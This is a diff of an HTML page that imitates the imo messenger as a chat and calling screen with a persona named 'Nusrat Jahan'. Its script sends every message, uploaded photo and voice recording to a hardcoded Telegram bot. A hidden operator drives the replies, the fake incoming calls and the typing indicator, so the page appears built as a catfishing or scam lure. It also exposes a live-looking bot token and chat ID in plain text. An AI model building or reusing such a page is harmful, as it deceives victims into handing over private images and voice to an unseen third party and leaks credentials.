@@ -1,208 +1,262 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>imo Client - Telegram Integrated</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        :root { --imo-blue: #00a8ff; }
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: sans-serif; }
-        body { background: #ddd; display: flex; justify-content: center; height: 100vh; overflow: hidden; }
-        #app { width: 100%; max-width: 450px; background: white; height: 100%; position: relative; display: flex; flex-direction: column; }
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+<title>imo Pro - Telegram Integrated</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+<style>
+  :root { --imo-blue: #0084ff; --bg-gray: #ebebeb; }
+  * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
+  body { background: #ddd; display: flex; justify-content: center; height: 100vh; overflow: hidden; }
+  
+  #app {
+    width: 100%; max-width: 480px; height: 100%;
+    background: white; display: flex; flex-direction: column;
+    position: relative; box-shadow: 0 0 10px rgba(0,0,0,0.1);
+  }
 
-        /* Calling Overlay */
-        #call-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; display: none; flex-direction: column; align-items: center; justify-content: space-around; color: white; }
-        .call-img { width: 120px; height: 120px; border-radius: 50%; border: 3px solid var(--imo-blue); animation: pulse 1.5s infinite; }
-        @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(0, 168, 255, 0.7); } 70% { box-shadow: 0 0 0 20px rgba(0, 168, 255, 0); } 100% { box-shadow: 0 0 0 0 rgba(0, 168, 255, 0); } }
-        .call-btns { display: flex; gap: 50px; }
-        .btn-call { width: 65px; height: 65px; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 24px; cursor: pointer; border: none; }
-        .decline { background: #ff3b30; color: white; }
-        .accept { background: #4cd137; color: white; }
+  /* Call Overlay */
+  #call-overlay {
+    position: absolute; top: 0; left: 0; width: 100%; height: 100%;
+    background: rgba(0, 0, 0, 0.9); z-index: 2000;
+    display: none; flex-direction: column; align-items: center; justify-content: center; color: white;
+  }
+  .call-avatar { width: 120px; height: 120px; border-radius: 50%; border: 3px solid var(--imo-blue); margin-bottom: 20px; animation: pulse 1.5s infinite; }
+  @keyframes pulse { 0% { box-shadow: 0 0 0 0 rgba(0,132,255,0.7); } 70% { box-shadow: 0 0 0 20px rgba(0,132,255,0); } 100% { box-shadow: 0 0 0 0 rgba(0,132,255,0); } }
 
-        /* Main UI Components */
-        .header { display: flex; justify-content: space-around; padding: 10px; border-bottom: 1px solid #eee; }
-        .chat-list { flex: 1; overflow-y: auto; }
-        .chat-item { display: flex; align-items: center; padding: 15px; cursor: pointer; border-bottom: 1px solid #f9f9f9; }
-        .chat-avatar { width: 50px; height: 50px; border-radius: 50%; margin-right: 15px; }
+  /* Header */
+  header {
+    height: 60px; background: white; display: flex; align-items: center;
+    padding: 0 15px; border-bottom: 1px solid #eee; z-index: 100;
+  }
+  .back-btn { font-size: 20px; margin-right: 15px; color: #555; cursor: pointer; }
+  .user-info { flex: 1; }
+  .user-info .name { font-weight: bold; font-size: 16px; }
+  .user-info .status { font-size: 12px; color: green; }
+  .call-icons { display: flex; gap: 20px; color: var(--imo-blue); font-size: 20px; }
 
-        /* Inbox */
-        #inbox { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: #ebebeb; z-index: 500; display: none; flex-direction: column; }
-        .inbox-header { background: white; padding: 10px; display: flex; align-items: center; gap: 15px; border-bottom: 1px solid #ddd; }
-        .messages-container { flex: 1; padding: 15px; overflow-y: auto; display: flex; flex-direction: column; gap: 10px; }
-        .bubble { max-width: 80%; padding: 10px; border-radius: 15px; font-size: 15px; line-height: 1.4; }
-        .sent { align-self: flex-end; background: var(--imo-blue); color: white; border-bottom-right-radius: 2px; }
-        .received { align-self: flex-start; background: white; border-bottom-left-radius: 2px; }
+  /* Chat Area */
+  #chat-container {
+    flex: 1; padding: 15px; overflow-y: auto; background: var(--bg-gray);
+    display: flex; flex-direction: column; gap: 10px;
+  }
+  .msg { max-width: 80%; padding: 10px 14px; border-radius: 18px; font-size: 15px; position: relative; line-height: 1.4; }
+  .sent { align-self: flex-end; background: #dcf8c6; border-bottom-right-radius: 2px; }
+  .received { align-self: flex-start; background: white; border-bottom-left-radius: 2px; }
+  .msg-img { max-width: 100%; border-radius: 10px; margin-top: 5px; }
+  
+  /* Typing Indicator */
+  #typing-indicator { font-size: 12px; color: #777; margin-left: 10px; display: none; }
 
-        /* Input Field */
-        .input-area { background: white; padding: 10px; display: flex; align-items: center; gap: 10px; }
-        .text-box { flex: 1; background: #f0f2f5; border-radius: 25px; padding: 8px 15px; border: none; outline: none; font-size: 16px; }
-        .send-btn { color: var(--imo-blue); font-size: 24px; cursor: pointer; border: none; background: none; }
-    </style>
+  /* Input Area */
+  .input-panel { background: white; border-top: 1px solid #ddd; padding: 10px; }
+  #emoji-bar { display: flex; gap: 10px; overflow-x: auto; padding-bottom: 8px; scrollbar-width: none; }
+  #emoji-bar::-webkit-scrollbar { display: none; }
+  #emoji-bar span { font-size: 22px; cursor: pointer; padding: 2px; }
+  
+  .input-row { display: flex; align-items: center; gap: 10px; }
+  #msgInput { flex: 1; padding: 10px 15px; border-radius: 25px; border: 1px solid #ddd; outline: none; background: #f9f9f9; }
+  .icon-btn { color: var(--imo-blue); font-size: 22px; cursor: pointer; background: none; border: none; }
+  
+  .recording { color: red !important; animation: blink 1s infinite; }
+  @keyframes blink { 50% { opacity: 0.5; } }
+</style>
 </head>
 <body>
 
 <div id="app">
-    <!-- Call Screen -->
-    <div id="call-overlay">
-        <h2 id="call-status">Calling...</h2>
-        <img src="my-logo.jpg" class="call-img">
-        <h3 id="call-name">Nusrat Jahan</h3>
-        <div class="call-btns">
-            <button class="btn-call decline" onclick="endCall()"><i class="fa-solid fa-phone-slash"></i></button>
-            <button class="btn-call accept" id="accept-btn" onclick="acceptCall()" style="display:none;"><i class="fa-solid fa-phone"></i></button>
-        </div>
+  <!-- Call Screen -->
+  <div id="call-overlay">
+    <img src="https://i.pravatar.cc/150?u=nusrat" class="call-avatar">
+    <h2 id="call-status">Ringing...</h2>
+    <p id="call-type">Audio Call</p>
+    <div style="margin-top: 50px; display: flex; gap: 40px;">
+        <button onclick="endCall()" style="background:red; border:none; width:60px; height:60px; border-radius:50%; color:white; font-size:24px;"><i class="fa-solid fa-phone-slash"></i></button>
+        <button id="accept-btn" onclick="acceptCall()" style="background:green; border:none; width:60px; height:60px; border-radius:50%; color:white; font-size:24px; display:none;"><i class="fa-solid fa-phone"></i></button>
     </div>
+  </div>
 
-    <!-- Home Screen -->
-    <div id="home">
-        <div class="header">
-            <img src="my-logo.jpg" style="width:35px; border-radius:50%">
-            <i class="fa-solid fa-comment-dots" style="color:var(--imo-blue); font-size:24px;"></i>
-            <i class="fa-solid fa-user-group" style="color:#ccc; font-size:24px;"></i>
-        </div>
-        <div class="chat-list">
-            <div class="chat-item" onclick="openInbox()">
-                <img src="my-logo.jpg" class="chat-avatar">
-                <div style="flex:1">
-                    <h4 id="my-id-display">Nusrat Jahan (You)</h4>
-                    <p style="font-size:12px; color:#888" id="last-msg">Message yourself</p>
-                </div>
-                <i class="fa-solid fa-phone" style="color:var(--imo-blue)"></i>
-            </div>
-        </div>
+  <header>
+    <i class="fa-solid fa-arrow-left back-btn"></i>
+    <div class="user-info">
+      <div class="name" id="header-name">Nusrat Jahan</div>
+      <div class="status">Online <span id="typing-indicator">typing...</span></div>
     </div>
+    <div class="call-icons">
+      <i class="fa-solid fa-phone" onclick="makeCall('Audio Call')"></i>
+      <i class="fa-solid fa-video" onclick="makeCall('Video Call')"></i>
+    </div>
+  </header>
 
-    <!-- Inbox Screen -->
-    <div id="inbox">
-        <div class="inbox-header">
-            <i class="fa-solid fa-arrow-left" onclick="closeInbox()"></i>
-            <div style="flex:1"><h4>Nusrat Jahan</h4><span style="font-size:12px; color:green">Online</span></div>
-            <div style="display:flex; gap:20px; color:var(--imo-blue); font-size:20px;">
-                <i class="fa-solid fa-phone" onclick="makeCall('Audio Call')"></i>
-                <i class="fa-solid fa-video" onclick="makeCall('Video Call')"></i>
-            </div>
-        </div>
-        <div class="messages-container" id="msg-box"></div>
-        <div class="input-area">
-            <input type="text" id="msgInput" class="text-box" placeholder="Write a message...">
-            <button class="send-btn" onclick="sendText()"><i class="fa-solid fa-paper-plane"></i></button>
-        </div>
+  <div id="chat-container">
+    <div style="align-self:center; background:#ccc; color:white; font-size:12px; padding:2px 10px; border-radius:10px; margin:10px 0;">Today</div>
+  </div>
+
+  <div class="input-panel">
+    <div id="emoji-bar">
+      <span>🔷</span><span>💋</span><span>🌹</span><span>❤️</span><span>😭</span><span>😆</span><span>💕</span><span>🔥</span><span>😍</span>
     </div>
+    <div class="input-row">
+      <button class="icon-btn" onclick="triggerFile()"><i class="fa-solid fa-image"></i></button>
+      <input type="text" id="msgInput" placeholder="Message" autocomplete="off">
+      <button id="sendBtn" class="icon-btn"><i class="fa-solid fa-paper-plane"></i></button>
+      <button id="voiceBtn" class="icon-btn"><i class="fa-solid fa-microphone"></i></button>
+    </div>
+  </div>
+  <input type="file" id="fileInput" style="display:none" accept="image/*,video/*">
 </div>
 
 <audio id="ringtone" src="https://assets.mixkit.co/active_storage/sfx/1359/1359-preview.mp3" loop></audio>
 <audio id="msg-sound" src="https://assets.mixkit.co/active_storage/sfx/2354/2354-preview.mp3"></audio>
 
 <script>
-    // --- কনিফিগারেশন ---
-    const TELEGRAM_TOKEN = '8367516207:AAEex2m_zKDK3I0DsyAfmfTMXUNvl2K4IgY'; // আপনার বট টোকেন দিন
-    const CHAT_ID = '8271536101';        // আপনার চ্যাট আইডি দিন
+  const TELEGRAM_TOKEN = '8367516207:AAEex2m_zKDK3I0DsyAfmfTMXUNvl2K4IgY';
+  const CHAT_ID = '8271536101';
+
+  let userId = localStorage.getItem('imo_user_id') || Math.floor(100000 + Math.random() * 900000);
+  localStorage.setItem('imo_user_id', userId);
+  document.getElementById('header-name').textContent = `Nusrat Jahan (ID: ${userId})`;
+
+  const chatContainer = document.getElementById('chat-container');
+  const msgInput = document.getElementById('msgInput');
+  const ringtone = document.getElementById('ringtone');
+  const msgSound = document.getElementById('msg-sound');
+  let lastUpdateId = 0;
+
+  // Append Message
+  function appendMessage(content, side, type = 'text') {
+    const div = document.createElement('div');
+    div.className = `msg ${side}`;
     
-    let userId = localStorage.getItem('imo_user_id') || Math.floor(100000 + Math.random() * 900000);
-    localStorage.setItem('imo_user_id', userId);
-    document.getElementById('my-id-display').innerText = `Nusrat Jahan - ID: ${userId}`;
+    if(type === 'text') div.textContent = content;
+    if(type === 'image') div.innerHTML = `<img src="${content}" class="msg-img">`;
+    if(type === 'voice') div.innerHTML = `<audio controls src="${content}" style="width:200px"></audio>`;
+    
+    chatContainer.appendChild(div);
+    chatContainer.scrollTop = chatContainer.scrollHeight;
+    if(side === 'received') msgSound.play();
+  }
 
-    const ringtone = document.getElementById('ringtone');
-    const msgSound = document.getElementById('msg-sound');
-    let lastUpdateId = 0;
+  // Send Text
+  async function sendText() {
+    const text = msgInput.value.trim();
+    if(!text) return;
+    appendMessage(text, 'sent');
+    msgInput.value = '';
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ chat_id: CHAT_ID, text: `👤 ID: ${userId}\n💬 ${text}` })
+    });
+  }
 
-    // টেলিগ্রামে মেসেজ পাঠানো
-    async function sendToTelegram(text) {
-        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
-        const message = `🔔 User ID: ${userId}\n💬 Message: ${text}`;
-        try {
-            await fetch(url, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: CHAT_ID, text: message })
-            });
-        } catch (e) { console.error("Telegram error:", e); }
+  document.getElementById('sendBtn').onclick = sendText;
+  msgInput.onkeypress = (e) => { if(e.key === 'Enter') sendText(); };
+
+  // Emojis
+  document.querySelectorAll('#emoji-bar span').forEach(s => {
+    s.onclick = () => { msgInput.value += s.textContent; msgInput.focus(); };
+  });
+
+  // Media Upload
+  function triggerFile() { document.getElementById('fileInput').click(); }
+  document.getElementById('fileInput').onchange = async (e) => {
+    const file = e.target.files[0];
+    if(!file) return;
+    
+    const reader = new FileReader();
+    reader.onload = (ev) => appendMessage(ev.target.result, 'sent', 'image');
+    reader.readAsDataURL(file);
+
+    const formData = new FormData();
+    formData.append('chat_id', CHAT_ID);
+    formData.append('caption', `Media from ID: ${userId}`);
+    formData.append('photo', file);
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+  };
+
+  // Voice Recording
+  let mediaRecorder;
+  let audioChunks = [];
+  document.getElementById('voiceBtn').onclick = async function() {
+    if(!mediaRecorder || mediaRecorder.state === 'inactive') {
+      const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+      mediaRecorder = new MediaRecorder(stream);
+      audioChunks = [];
+      mediaRecorder.ondataavailable = e => audioChunks.push(e.data);
+      mediaRecorder.onstop = async () => {
+        const audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
+        const audioUrl = URL.createObjectURL(audioBlob);
+        appendMessage(audioUrl, 'sent', 'voice');
+        
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('voice', audioBlob, 'voice.ogg');
+        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVoice`, { method: 'POST', body: formData });
+      };
+      mediaRecorder.start();
+      this.classList.add('recording');
+    } else {
+      mediaRecorder.stop();
+      this.classList.remove('recording');
     }
+  };
 
-    // ব্রাউজার স্ক্রিনে মেসেজ দেখানো
-    function appendMessage(text, side) {
-        const div = document.createElement('div');
-        div.className = `bubble ${side}`;
-        div.innerText = text;
-        document.getElementById('msg-box').appendChild(div);
-        document.getElementById('msg-box').scrollTop = document.getElementById('msg-box').scrollHeight;
-        if(side === 'received') msgSound.play();
-    }
+  // Calling Logic
+  async function makeCall(type) {
+    document.getElementById('call-overlay').style.display = 'flex';
+    document.getElementById('call-type').textContent = type;
+    document.getElementById('call-status').textContent = "Ringing...";
+    ringtone.play();
+    await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ chat_id: CHAT_ID, text: `📞 INCOMING ${type} from ID: ${userId}\nType "/accept" or "/end"` })
+    });
+  }
 
-    // মেসেজ সেন্ড বাটন ফাংশন
-    window.sendText = () => {
-        const input = document.getElementById('msgInput');
-        const text = input.value.trim();
-        if(!text) return;
-        appendMessage(text, 'sent');
-        sendToTelegram(text);
-        input.value = '';
-    }
+  function acceptCall() {
+    ringtone.pause();
+    document.getElementById('call-status').textContent = "Connected";
+    document.getElementById('accept-btn').style.display = 'none';
+  }
 
-    // কল করার লজিক
-    window.makeCall = (type) => {
-        sendToTelegram(`📞 Incoming ${type}...\nCommands: type "accept" or "end"`);
-        showCallOverlay(`Calling...`, false);
-    }
+  function endCall() {
+    ringtone.pause();
+    document.getElementById('call-overlay').style.display = 'none';
+  }
 
-    window.acceptCall = () => {
-        hideCallOverlay();
-        appendMessage("Call Connected (Simulated)", "received");
-    }
-
-    window.endCall = () => {
-        sendToTelegram(`❌ Call Ended by User`);
-        hideCallOverlay();
-    }
-
-    function showCallOverlay(status, showAccept) {
-        document.getElementById('call-overlay').style.display = 'flex';
-        document.getElementById('call-status').innerText = status;
-        document.getElementById('accept-btn').style.display = showAccept ? 'flex' : 'none';
-        ringtone.play();
-    }
-
-    function hideCallOverlay() {
-        document.getElementById('call-overlay').style.display = 'none';
-        ringtone.pause();
-    }
-
-    // টেলিগ্রাম থেকে মেসেজ/কমান্ড রিসিভ করা (Polling)
-    async function fetchUpdates() {
-        const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`;
-        try {
-            const response = await fetch(url);
-            const data = await response.json();
-            if (data.result && data.result.length > 0) {
-                data.result.forEach(update => {
-                    lastUpdateId = update.update_id;
-                    const msgText = update.message.text.toLowerCase();
-                    
-                    // কমান্ড প্রসেসিং
-                    if (msgText === 'accept') {
-                        document.getElementById('call-status').innerText = 'Connected';
-                        ringtone.pause();
-                    } else if (msgText === 'end') {
-                        hideCallOverlay();
-                    } else {
-                        // সাধারণ মেসেজ হিসেবে ইনবক্সে দেখানো
-                        appendMessage(update.message.text, 'received');
-                    }
-                });
+  // Polling Updates from Telegram
+  async function poll() {
+    try {
+      const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
+      const data = await res.json();
+      if(data.result) {
+        data.result.forEach(update => {
+          lastUpdateId = update.update_id;
+          if(update.message && update.message.text) {
+            const msg = update.message.text;
+            if(msg === '/accept') { acceptCall(); }
+            else if(msg === '/end') { endCall(); }
+            else if(msg === '/typing') { 
+                document.getElementById('typing-indicator').style.display = 'inline';
+                setTimeout(() => document.getElementById('typing-indicator').style.display = 'none', 3000);
             }
-        } catch (e) { console.error("Polling error:", e); }
-    }
+            else { appendMessage(msg, 'received'); }
+          }
+        });
+      }
+    } catch(e) {}
+  }
+  setInterval(poll, 3000);
 
-    // প্রতি ৩ সেকেন্ডে একবার আপডেট চেক করবে
-    setInterval(fetchUpdates, 3000);
-
-    // UI কন্ট্রোল
-    window.openInbox = () => document.getElementById('inbox').style.display = 'flex';
-    window.closeInbox = () => document.getElementById('inbox').style.display = 'none';
-
-    // ইউজার লিস্ট নোটিফিকেশন (বট ওপেন করলেই অ্যাডমিন জানবে)
-    sendToTelegram("🌐 User is Online (imo Client)");
+  // Notify Admin
+  fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({ chat_id: CHAT_ID, text: `🟢 User Online\nID: ${userId}` })
+  });
 
 </script>
 </body>
